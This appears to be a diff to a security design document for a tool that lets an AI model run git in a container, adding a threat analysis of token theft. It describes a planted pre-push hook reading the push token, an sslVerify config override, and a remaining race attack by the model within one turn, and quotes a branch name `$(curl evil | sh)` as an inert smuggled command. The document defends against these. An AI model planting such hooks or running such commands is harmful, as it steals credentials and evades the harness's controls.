@@ -24,6 +24,18 @@ same seam; anything with the signature above works.
 
 Nowhere the model or the container can read it:
 
+- **Never in a repository the model can configure.** Git executes what
+  `.git/config` and `.git/hooks` tell it to, both live in the workspace
+  filesystem, and a co-installed shell tool can write them — so a planted
+  `pre-push` hook ran on an ordinary `repo_push` and read the token straight out
+  of the environment it inherited. Patching that key by key does not work
+  either: a URL-specific `http.<url>.sslVerify=false` in the repository's own
+  config beats a `-c` override, because specificity outranks precedence. So
+  `clone`, `fetch` and `push` run in a bare git dir created per operation, whose
+  entire configuration is what `git init` wrote and whose whole config is given
+  on the command line — the one channel nothing in the container can rewrite
+  underneath us. The checkout's objects are reached through an alternates file,
+  so nothing is copied.
 - **Never in a command string.** A command line is echoed into stdout, into
   stderr on failure, into shell history, and into any VCR cassette. The token
   goes through `exec`'s per-command `env`, and `git` reads it back via a
@@ -44,6 +56,14 @@ Nowhere the model or the container can read it:
 The same mechanism carries every **model-authored** value — URLs, branch names,
 commit messages — as an environment variable rather than interpolating it into a
 command, so a branch name of `$(curl evil | sh)` is inert text.
+
+What remains is not zero. The model has a root shell in the same filesystem, so
+it can still race a write against the isolated dir between the command that
+creates it and the command that uses it. What the arrangement above removes is
+the durable form of that attack — plant once, collect on every future push — and
+what is left has to win a race inside a single turn. Removing the rest means not
+doing authenticated git in the container at all, i.e. pushing from the Worker
+over the forge's API.
 
 ## Guardrails are in the tool, not the prompt
 
